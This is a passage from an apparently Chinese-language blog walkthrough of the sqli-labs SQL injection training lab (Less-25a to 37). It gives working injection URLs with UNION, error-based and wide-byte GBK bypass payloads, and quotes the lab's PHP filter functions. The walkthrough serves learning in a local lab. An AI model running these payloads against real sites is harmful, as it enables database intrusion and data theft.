class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-25a-Trick-with-OR-amp-AND-Blind-过滤了or和and的盲注"><a href="#Less-25a-Trick-with-OR-amp-AND-Blind-过滤了or和and的盲注" class="headerlink" title="Less-25a Trick with OR &amp; AND Blind (过滤了or和and的盲注)"></a>Less-25a Trick with OR &amp; AND Blind (过滤了or和and的盲注)</h3><h4 id="手动注入-23"><a href="#手动注入-23" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-25a/?id=-1 <span class="attribute">UNION</span> <span class="literal">select</span> <span class="number">1</span>,@<span class="variable">@basedir</span>,<span class="number">3</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><h3 id="Less-26-Trick-with-comments-and-space-过滤了注释和空格的注入"><a href="#Less-26-Trick-with-comments-and-space-过滤了注释和空格的注入" class="headerlink" title="Less-26 Trick with comments and space (过滤了注释和空格的注入)"></a>Less-26 Trick with comments and space (过滤了注释和空格的注入)</h3><h4 id="手动注入-24"><a href="#手动注入-24" class="headerlink" title="手动注入"></a>手动注入</h4><p>我们可以用url编码进行绕过(这些编码在Windows下使用可能会出现问题)</p><p>%09 Tab键（水平）<br>%0a 新建一行<br>%0c 新的一页<br>%0d return 键<br>%0b Tab键（垂直）<br>%a0 空格</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-26/?id=1&#x27;anandd(updatexml(1,concat(0x7e,(<span class="attribute">select</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>));%00</span><br></pre></td></tr></table></figure><h4 id="源码分析-24"><a href="#源码分析-24" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-过滤了空格和注释的盲注"><a href="#less-26a-GET-Blind-Based-All-your-SPACES-and-COMMENTS-belong-to-us-过滤了空格和注释的盲注" class="headerlink" title="less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)"></a>less 26a GET - Blind Based - All your SPACES and COMMENTS belong to us(过滤了空格和注释的盲注)</h3><h4 id="手动注入-25"><a href="#手动注入-25" class="headerlink" title="手动注入"></a>手动注入</h4><p>不能报错注入，直接盲注即可</p><h4 id="源码分析-25"><a href="#源码分析-25" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out spaces</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out slashes</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-过滤了union和select的"><a href="#less-27-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-过滤了union和select的" class="headerlink" title="less 27 GET - Error Based- All your UNION &amp; SELECT belong to us (过滤了union和select的)"></a>less 27 GET - Error Based- All your UNION &amp; SELECT belong to us (过滤了union和select的)</h3><h4 id="手动注入-26"><a href="#手动注入-26" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-27/?id=1&#x27;and(uPdatexml(1,conCat(0x7e,(<span class="attribute">selEct</span> @<span class="variable">@version</span>),0x7e),<span class="number">1</span>));%00</span><br></pre></td></tr></table></figure><h4 id="源码分析-26"><a href="#源码分析-26" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us"><a href="#less-27a-GET-Blind-Based-All-your-UNION-amp-SELECT-belong-to-us" class="headerlink" title="less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us"></a>less 27a GET - Blind Based- All your UNION &amp; SELECT belong to us</h3><h4 id="手动注入-27"><a href="#手动注入-27" class="headerlink" title="手动注入"></a>手动注入</h4><p>不能报错注入，直接盲注即可</p><h4 id="源码分析-27"><a href="#源码分析-27" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis-基于错误的，有括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28-GET-Error-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis-基于错误的，有括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis (基于错误的，有括号的单引号字符型，过滤了union和select等的注入)"></a>less 28 GET - Error Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis (基于错误的，有括号的单引号字符型，过滤了union和select等的注入)</h3><h4 id="手动注入-28"><a href="#手动注入-28" class="headerlink" title="手动注入"></a>手动注入</h4><p>双写绕过即可</p><h4 id="源码分析-28"><a href="#源码分析-28" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入"><a href="#less-28a-GET-Bind-Based-All-your-UNION-amp-SELECT-belong-to-us-String-Single-quote-with-parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入" class="headerlink" title="less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入"></a>less 28a GET - Bind Based- All your UNION &amp; SELECT belong to us String-Single quote with parenthesis基于盲注的，有括号的单引号字符型，过滤了union和select等的注入</h3><h4 id="手动注入-29"><a href="#手动注入-29" class="headerlink" title="手动注入"></a>手动注入</h4><p>双写绕过即可</p><h4 id="源码分析-29"><a href="#源码分析-29" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[\/\*]/&#x27;,&quot;&quot;, $id);//strip out /*</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[--]/&#x27;,&quot;&quot;, $id);//Strip out --.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[#]/&#x27;,&quot;&quot;, $id);//Strip out #.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/[ +]/&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-29-基于WAF的一个错误"><a href="#Less-29-基于WAF的一个错误" class="headerlink" title="Less-29 基于WAF的一个错误"></a>Less-29 基于WAF的一个错误</h3><h4 id="手动注入-30"><a href="#手动注入-30" class="headerlink" title="手动注入"></a>手动注入</h4><p>注意要配好<code>tomcat</code>的相关环境</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-30-Get-Blind-Havaing-with-WAF"><a href="#Less-30-Get-Blind-Havaing-with-WAF" class="headerlink" title="Less-30 Get-Blind Havaing with WAF"></a>Less-30 Get-Blind Havaing with WAF</h3><h4 id="手动注入-31"><a href="#手动注入-31" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&quot;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-31-Protection-with-WAF"><a href="#Less-31-Protection-with-WAF" class="headerlink" title="Less-31 Protection with WAF"></a><strong>Less-31 Protection with WAF</strong></h3><h4 id="手动注入-32"><a href="#手动注入-32" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-29/index.jsp?id=1&amp;id=-1&quot;)<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h3 id="Less-32-Bypass-addslashes"><a href="#Less-32-Bypass-addslashes" class="headerlink" title="Less-32 Bypass addslashes()"></a>Less-32 Bypass addslashes()</h3><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>mysql 在使用 GBK 编码的时候，会认为两个字符为一个汉字，例如%aa%5c 就是一个 汉字（前一个 ascii 码大于 128 才能到汉字的范围）。我们在过滤 ’ 的时候，往往利用的思 路是将 ‘ 转换为 \’ （转换的函数或者思路会在每一关遇到的时候介绍）。 因此我们在此想办法将 ‘ 前面添加的 \ 除掉，一般有两种思路： </p><p>（1）%df 吃掉 \ 具体的原因是 urlencode(‘\) &#x3D; %5c%27，我们在%5c%27 前面添加%df，形 成%df%5c%27，而上面提到的 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，此 事%df%5c 就是一个汉字，%27 则作为一个单独的符号在外面，同时也就达到了我们的目的。</p><p>（2）将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 的情况，后面的%5c 会被前面的%5c 给注释掉。这也是 bypass 的一种方法</p><h4 id="手动注入-33"><a href="#手动注入-33" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-32/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-30"><a href="#源码分析-30" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&#x27;</span>. <span class="title function_ invoke__">preg_quote</span>(<span class="string">&#x27;\\&#x27;</span>) .<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;\\\\\\&quot;</span>, <span class="variable">$string</span>);          <span class="comment">//escape any backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#x27;/i&#x27;</span>, <span class="string">&#x27;\\\&#x27;&#x27;</span>, <span class="variable">$string</span>);                               <span class="comment">//escape single quote with a backslash</span></span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&quot;/&#x27;</span>, <span class="string">&quot;\\\&quot;&quot;</span>, <span class="variable">$string</span>);                                <span class="comment">//escape double quote with a backslash</span></span><br><span class="line">      </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-33-Bypass-addslashes"><a href="#Less-33-Bypass-addslashes" class="headerlink" title="Less-33 Bypass addslashes()"></a>Less-33 Bypass addslashes()</h3><h4 id="手动注入-34"><a href="#手动注入-34" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-33/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-31"><a href="#源码分析-31" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>= <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-34-Bypass-Add-SLASHES"><a href="#Less-34-Bypass-Add-SLASHES" class="headerlink" title="Less-34 Bypass Add SLASHES"></a>Less-34 Bypass Add SLASHES</h3><h4 id="手动注入-35"><a href="#手动注入-35" class="headerlink" title="手动注入"></a>手动注入</h4><p><img src="https://s2.loli.net/2022/05/17/sv6kSR8guHL12Dh.png" alt="34.png"></p><h3 id="Less-35-why-care-for-addslashes"><a href="#Less-35-why-care-for-addslashes" class="headerlink" title="Less-35 why care for addslashes()"></a>Less-35 why care for addslashes()</h3><h4 id="手动注入-36"><a href="#手动注入-36" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-35/?id=-1 <span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>;--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-32"><a href="#源码分析-32" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-36-Bypass-MySQL-Real-Escape-String"><a href="#Less-36-Bypass-MySQL-Real-Escape-String" class="headerlink" title="Less-36 Bypass MySQL Real Escape String"></a>Less-36 Bypass MySQL Real Escape String</h3><h4 id="手动注入-37"><a href="#手动注入-37" class="headerlink" title="手动注入"></a>手动注入</h4><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8081/sqli-labs/Less-36/?id=-1%df&#x27;<span class="attribute">union</span> <span class="literal">select</span> <span class="number">1</span>,database(),<span class="number">3</span>--+</span><br><span class="line">http://127.0.0.1:8081/sqli-labs/Less-36/?id=-1%EF%BF%BD&#x27;union <span class="literal">select</span> <span class="number">1</span>,user(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h4 id="源码分析-33"><a href="#源码分析-33" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_quotes</span>(<span class="params"><span class="variable">$con1</span>, <span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span>=<span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$string</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Less-37-MySQL-real-escape-string"><a href="#Less-37-MySQL-real-escape-string" class="headerlink" title="Less-37- MySQL_real_escape_string"></a>Less-37- MySQL_real_escape_string</h3><h4 id="手动注入-38"><a href="#手动注入-38" class="headerlink" title="手动注入"></a>手动注入</h4><p>用burp即可</p><h4 id="源码分析-34"><a href="#源码分析-34" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$uname</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$con1</span>, <span class="variable">$uname1</span>);</span><br><span class="line"><span 